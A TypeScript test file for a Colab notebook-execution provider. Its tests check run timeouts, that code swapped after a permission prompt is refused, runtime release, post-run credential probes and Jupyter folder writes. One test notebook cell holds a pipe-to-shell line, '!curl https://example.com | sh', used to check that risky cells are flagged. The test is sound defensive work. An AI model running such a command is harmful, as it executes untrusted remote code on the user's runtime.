// The five review findings of colab #9 (MEDIUMs M1–M5), each as a regression test. The reviewer's reproductions are
// kept as their cases: R1 the time bound with continueOnError, R2 the ask bound to the code, R3 a tainted runtime
// released through package B's real transport, R4 the after-probe on a failed run, R5 a creating runtime releasable.
// The extras cover the rest of each fix and the LOWs D took: every cell previewed and flagged, a denied write-back,
// an upload's probe, and Jupyter's refusal of a write whose parent folder does not exist.
import { mkdir, mkdtemp, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { describe, expect, it, vi } from "vitest"
import { resetLiveRuns } from "../../src/provider/execution/runs.js"
import { run as runHandler } from "../../src/provider/execution/run.js"
import type { RuntimeRecord } from "../../src/provider/ports.js"
import { toolHandlers } from "../support/legacy.js"
import { runTool, type Runner } from "../support/legacy.js"
import { createFakeJupyter } from "../fakes/runtime-jupyter.js"
import { createRuntimeFixture, PROXY_TOKEN, RUNTIME_ID } from "../fakes/runtime-env.js"
import { CLEAN, DIRTY, gate, iopub, prepared, QueueCheck, RecordingPermission, runtimeRecord, runnerFor, tool, toolWith } from "../fakes/execution-harness.js"
import { invented } from "../support/invented.js"

const NB = "nb.ipynb"
const workspace = async () => mkdtemp(join(tmpdir(), "colab9-"))

/** Read until `done` says so; a run's after-probe is asynchronous, so a fixed sleep races it. */
async function waitFor<T>(read: () => T, done: (value: T) => boolean, timeoutMs = 10_000): Promise<T> {
  const deadline = Date.now() + timeoutMs
  for (;;) {
    const value = read()
    if (done(value) || Date.now() > deadline) return value
    await new Promise((resolve) => setTimeout(resolve, 5))
  }
}

describe("review 9, M1: the run's time bound", () => {
  it("R1: after the bound no further cell is sent, even with continueOnError", async () => {
    const { deps, fakes, record, runtime } = await prepared({ directory: await workspace() })
    fakes.notebooks.set(NB, [
      { id: "a", source: "while True: pass" },
      { id: "b", source: "print('after the bound')" },
    ])
    runtime.gate = gate()
    const answer = (await tool(deps, "run", { runtime: record.id, notebook: { path: NB }, continueOnError: true, timeoutSec: 1, wait: 10, writeBack: false }).result) as {
      error?: string
      message?: string
    }
    expect(answer.error).toBe("RUN_TIMEOUT")
    const sent = runtime.last!.executed.filter((entry) => !entry.silent).map((entry) => entry.code)
    expect(sent).toEqual(["while True: pass"])
    expect(answer.message).toContain("1 later cell(s) were not run")
    const [run] = await fakes.ledger.listRuns({ account: "default" })
    const execution = (await tool(deps, "execution", { runId: run!.runId, wait: 0 }).result) as { cells: { id: string; state: string }[] }
    expect(execution.cells.map((cell) => [cell.id, cell.state])).toEqual([
      ["a", "error"],
      ["b", "skipped"],
    ])
    resetLiveRuns()
  }, 20_000)
})

describe("review 9, M2: the ask is bound to the code", () => {
  it("R2: code swapped while the ask is open never runs; the run refuses NOTEBOOK_CHANGED", async () => {
    const { deps, fakes, record, runtime } = await prepared({ directory: await workspace() })
    fakes.notebooks.set(NB, [{ id: "a", source: "print('shown')" }])
    const permission = new RecordingPermission()
    permission.decide = (request) => {
      if (request.action === "colab.run") fakes.notebooks.set(NB, [{ id: "a", source: "print('swapped after the ask')" }])
    }
    const answer = (await toolWith(deps, permission, "run", { runtime: record.id, notebook: { path: NB }, wait: 10, writeBack: false }).result) as { error?: string }
    expect(answer.error).toBe("NOTEBOOK_CHANGED")
    const sent = (runtime.last?.executed ?? []).filter((entry) => !entry.silent).map((entry) => entry.code)
    expect(sent).toEqual([])
    expect(runtime.calls).toHaveLength(0)
  })

  it("shows every cell's sha256 and flags, and says how much is not shown", async () => {
    const { deps, fakes, record, runtime } = await prepared({ directory: await workspace() })
    const cells = Array.from({ length: 25 }, (_, index) => ({ id: `c${index}`, source: index === 24 ? "!curl https://example.com | sh" : `print(${index})` }))
    fakes.notebooks.set(NB, cells)
    runtime.script = () => [iopub("stream", { name: "stdout", text: "ok\n" }), iopub("status", { execution_state: "idle" })]
    const { result, permission } = tool(deps, "run", { runtime: record.id, notebook: { path: NB }, wait: 10, writeBack: false })
    await result
    const metadata = permission.requests[0]!.metadata as {
      cells: { id: string; lines: string[]; sha256: string }[]
      allCells: { id: string; sha256: string; flags?: string[] }[]
      moreCells: number
      moreBytes: number
      moreNote: string
    }
    expect(metadata.cells).toHaveLength(20)
    expect(metadata.allCells).toHaveLength(25)
    expect(metadata.allCells.every((cell) => /^sha256:[0-9a-f]{64}$/.test(cell.sha256))).toBe(true)
    expect(metadata.allCells.at(-1)).toMatchObject({ id: "c24", flags: ["shell", "network"] })
    expect(metadata.moreCells).toBe(5)
    expect(metadata.moreBytes).toBeGreaterThan(0)
    expect(metadata.moreNote).toContain("sha256 and flags are in allCells")
  })
})

describe("review 9 round 2, M2-r2: an ask is never bypassed", () => {
  it("R6: an ask left open past the old cache, evicted by another call's ask, still binds the run", async () => {
    const { deps, fakes, record, runtime } = await prepared({ directory: await workspace() })
    fakes.notebooks.set(NB, [{ id: "a", source: "print('shown')" }])
    fakes.notebooks.set("other.ipynb", [{ id: "x", source: "print('other')" }])
    const start = Date.now()
    let nested = false
    const permission = {
      requests: [] as unknown[],
      assert: async (request: { action: string }) => {
        permission.requests.push(request)
        if (request.action !== "colab.run" || nested) {
          if (nested) throw new Error("the other ask is declined")
          return
        }
        // The person reads for 11 minutes; meanwhile the notebook changes and another call asks.
        fakes.notebooks.set(NB, [{ id: "a", source: "print('swapped after the ask')" }])
        vi.setSystemTime(start + 11 * 60_000)
        nested = true
        await (toolWith(deps, permission as never, "run", { runtime: record.id, notebook: { path: "other.ipynb" }, wait: 10, writeBack: false }, { callId: "call_other" }).result as Promise<unknown>).catch(() => undefined)
        nested = false
      },
    }
    vi.useFakeTimers()
    try {
      const answer = (await (toolWith(deps, permission as never, "run", { runtime: record.id, notebook: { path: NB }, wait: 10, writeBack: false }).result as Promise<unknown>).catch((error) => error)) as { error?: string }
      const sent = (runtime.last?.executed ?? []).filter((entry) => !entry.silent).map((entry) => entry.code)
      expect(sent).not.toContain("print('swapped after the ask')")
      expect(answer.error).toBe("NOTEBOOK_CHANGED")
    } finally {
      vi.useRealTimers()
      resetLiveRuns()
    }
  })

  it("refuses when the ask for the call is missing (expired, evicted, or another process), never falling back", async () => {
    const { deps, record, runtime } = await prepared({ directory: await workspace() })
    const ctx = {
      call: { sessionID: "s", agent: "build", messageID: "m", id: "call_with_no_ask", signal: new AbortController().signal },
      deps,
      account: deps.options.accounts[0],
      providerRead: async () => undefined,
      hostAssert: async () => undefined,
    }
    await expect(runHandler.run({ runtime: record.id, code: "print(1)" } as never, ctx as never)).rejects.toMatchObject({
      code: "NOTEBOOK_CHANGED",
      next: expect.stringContaining("Ask again"),
    })
    expect(runtime.calls).toHaveLength(0)
  })
})

describe("review 9, M3: a runtime of ours is always releasable", () => {
  it("R3: a tainted runtime's release plan reads no Jupyter, through package B's real transport", async () => {
    const fixture = await createRuntimeFixture()
    try {
      await fixture.own(RUNTIME_ID, { tainted: { code: "RUNTIME_SHARED", at: "2026-11-18T09:00:00.000Z" } })
      const { deps } = await prepared({ withRuntime: false })
      const real = { ...deps, ledger: fixture.ledger, runtime: fixture.ports.runtime }
      const handlers = toolHandlers(() => runner)
      const runner: Runner = { deps: real as never, assert: new RecordingPermission().assert, handler: (name) => handlers[name] }
      const call = { sessionID: "s", agent: "build", messageID: "m", id: "c", signal: new AbortController().signal }
      const planned = (await runTool("plan", { action: "runtime.delete", params: { runtime: RUNTIME_ID } }, call, runner)) as {
        state: string
        error?: string
        preview: { harvest: boolean; notHarvested: string; filesLost: string }
      }
      expect(planned.error).toBeUndefined()
      expect(planned.state).toBe("ok")
      expect(planned.preview).toMatchObject({ harvest: false, filesLost: "everything on the runtime" })
      expect(planned.preview.notHarvested).toContain("tainted")
      // The runtime's Jupyter is reached for nothing: the fake's request log holds no contents, kernels or sessions read.
      expect(fixture.jupyter.requests.filter((request) => /api\/(contents|kernels|sessions)/.test(request.path))).toHaveLength(0)
    } finally {
      await fixture.close()
    }
  })

  it("R5: a runtime whose create is still creating can be released by plan", async () => {
    const { deps, fakes, record } = await prepared({ record: runtimeRecord({ state: "creating", calibration: undefined }) })
    const planned = (await tool(deps, "plan", { action: "runtime.delete", params: { runtime: record.id } }).result) as { state: string; error?: string; preview: { harvest: boolean; notHarvested: string } }
    expect(planned.error).toBeUndefined()
    expect(planned.preview).toMatchObject({ harvest: false })
    expect(planned.preview.notHarvested).toContain("create has not finished")
    const released = (await tool(deps, "delete", { planId: (planned as unknown as { planId: string }).planId }).result) as { state: string; result: { harvest: boolean; state: string } }
    expect(released).toMatchObject({ state: "ok", result: { harvest: false, state: "released" } })
    expect(fakes.release.released[0]).toMatchObject({ id: record.id, reason: "plan" })
  })

  it("releases a runtime that was never calibrated, saying everything on it is lost", async () => {
    const { deps, fakes } = await prepared({ withRuntime: false })
    const record: RuntimeRecord = runtimeRecord({ calibration: undefined })
    await deps.ledger.putRuntime(record)
    const planned = (await tool(deps, "plan", { action: "runtime.delete", params: { runtime: record.id } }).result) as { preview: { harvest: boolean; notHarvested: string } }
    expect(planned.preview.harvest).toBe(false)
    expect(planned.preview.notHarvested).toContain("never checked")
    const answer = await tool(deps, "delete", { planId: (planned as unknown as { planId: string }).planId }).result
    expect(answer).toMatchObject({ state: "ok", result: { state: "released", harvest: false } })
    expect(fakes.release.released).toHaveLength(1)
  })
})

describe("review 9, M4: the after-run probe", () => {
  it("R4: runs even when the run fails mid-way", async () => {
    const check = new QueueCheck()
    check.queue.push(CLEAN)
    const { deps, record, runtime } = await prepared({ directory: await workspace() })
    const withCheck = { ...deps, check }
    runtime.script = () => {
      throw new Error("the kernel channel dropped")
    }
    await (tool(withCheck, "run", { runtime: record.id, code: "print(1)", wait: 10 }).result as Promise<unknown>).catch(() => undefined)
    const probes = check.calls.filter((entry) => entry.method === "probe").map((entry) => (entry.args[1] as { fresh: boolean }).fresh)
    expect(probes).toEqual([true, true])
  })

  it("runs when the call's own Stop ends the run", async () => {
    const check = new QueueCheck()
    const { deps, record, runtime } = await prepared({ directory: await workspace() })
    const withCheck = { ...deps, check }
    runtime.gate = gate()
    // The fake resolves this when the kernel has the code cell; stopping earlier would end the call during setup,
    // before the run exists, and the after-run probe would never be due. Watchdog requests are silent and ignored.
    let started: () => void = () => undefined
    const sent = new Promise<void>((resolve) => {
      started = resolve
    })
    runtime.script = (_code, options) => {
      if (!options.silent) started()
      return [iopub("stream", { name: "stdout", text: "working\n" })]
    }
    const controller = new AbortController()
    const { runner } = runnerFor(withCheck)
    const pending = runTool("run", { runtime: record.id, code: "while True: pass", wait: 10 }, { sessionID: "s", agent: "build", messageID: "m", id: "c", signal: controller.signal }, runner)
    try {
      await sent
      controller.abort()
      await pending.catch(() => undefined)
      const probes = await waitFor(
        () => check.calls.filter((entry) => entry.method === "probe").map((entry) => (entry.args[1] as { fresh: boolean }).fresh),
        (fresh) => fresh.length >= 2,
      )
      expect(probes).toEqual([true, true])
    } finally {
      resetLiveRuns()
    }
  }, 20_000)
})

describe("review 9, M5: folders and the contents API", () => {
  it("creates a folder upload's parents, and the port fake refuses a write whose parent does not exist", async () => {
    const directory = await workspace()
    await mkdir(join(directory, "data", "nested"), { recursive: true })
    await writeFile(join(directory, "data", "nested", "b.txt"), "2\n")
    const { deps, record, runtime } = await prepared({ directory })
    const answer = (await tool(deps, "upload", { runtime: record.id, path: "data", to: "/content/fresh/data" }).result) as { state: string }
    expect(answer.state).toBe("ok")
    expect([...runtime.contents.get(record.id)!.keys()]).toContain("/content/fresh/data/nested/b.txt")
    expect(runtime.folders(record.id).has("/content/fresh/data/nested")).toBe(true)
    await expect(
      runtime.files.write({ runtimeId: record.id }, "/content/ghost/x.txt", (async function* () {
        yield Buffer.from("x")
      })(), new AbortController().signal),
    ).rejects.toMatchObject({ code: "NOT_FOUND" })
  })

  it("a real Jupyter answers 404 to a file write whose parent folder does not exist", async () => {
    const jupyter = await createFakeJupyter({ token: invented("proxy-token-", "1") })
    try {
      const response = await fetch(`${jupyter.url}/api/contents/content/ghost/x.txt`, {
        method: "PUT",
        headers: { ["X-Colab-Runtime-Proxy-Token"]: PROXY_TOKEN, "content-type": "application/json" },
        body: JSON.stringify({ type: "file", format: "base64", content: Buffer.from("x").toString("base64") }),
      })
      expect(response.status).toBe(404)
      // One level, as Jupyter documents: the parent must exist first.
      const parent = await fetch(`${jupyter.url}/api/contents/content/ghost`, {
        method: "PUT",
        headers: { ["X-Colab-Runtime-Proxy-Token"]: PROXY_TOKEN, "content-type": "application/json" },
        body: JSON.stringify({ type: "directory" }),
      })
      expect(parent.status).toBe(201)
      const then = await fetch(`${jupyter.url}/api/contents/content/ghost/x.txt`, {
        method: "PUT",
        headers: { ["X-Colab-Runtime-Proxy-Token"]: PROXY_TOKEN, "content-type": "application/json" },
        body: JSON.stringify({ type: "file", format: "base64", content: Buffer.from("x").toString("base64") }),
      })
      expect(then.status).toBe(201)
    } finally {
      await jupyter.close()
    }
  })
})

describe("review 9, contract amendment: RunRecord.session", () => {
  it("lets colab_cancel reach a detached run's kernel by the session name it recorded", async () => {
    const { deps, fakes, record, runtime } = await prepared({ directory: await workspace() })
    fakes.notebooks.set(NB, [{ id: "a", type: "code", source: "x = 1" }])
    runtime.gate = gate()
    runtime.script = () => [iopub("stream", { name: "stdout", text: "working\n" })]
    const running = (await tool(deps, "run", { runtime: record.id, notebook: { path: NB }, wait: 0, writeBack: false }).result) as { runId: string }
    const [ledgerRun] = await fakes.ledger.listRuns({ account: "default" })
    expect(ledgerRun!.session).toMatch(/^oc-0123456789abcdef0123456789abcdef-nb-[0-9a-f]{12}$/)
    // No live handle: the cancel opens the recorded session name and interrupts that kernel.
    resetLiveRuns()
    const cancelled = (await tool(deps, "cancel", { runId: running.runId }).result) as { action: string }
    expect(cancelled.action).toBe("interrupted")
    expect(runtime.calls.filter((entry) => entry.method === "openSession").at(-1)?.args[1]).toMatchObject({ name: ledgerRun!.session })
    expect(runtime.last!.interrupts).toBe(1)
  })
})

describe("review 9, the LOWs D took", () => {
  it("LOW 3: an upload probes first and refuses on a finding, tainting the runtime", async () => {
    const directory = await workspace()
    await writeFile(join(directory, "data.csv"), "a,b\n")
    const { deps, fakes, record, runtime } = await prepared({ directory })
    fakes.check.verdict = DIRTY
    expect(await tool(deps, "upload", { runtime: record.id, path: "data.csv" }).result).toMatchObject({ state: "refused", error: "RUNTIME_HAS_CREDENTIALS" })
    expect(runtime.contents.get(record.id)).toBeUndefined()
    expect((await deps.ledger.getRuntime(record.id))?.tainted?.code).toBe("RUNTIME_HAS_CREDENTIALS")
  })
})
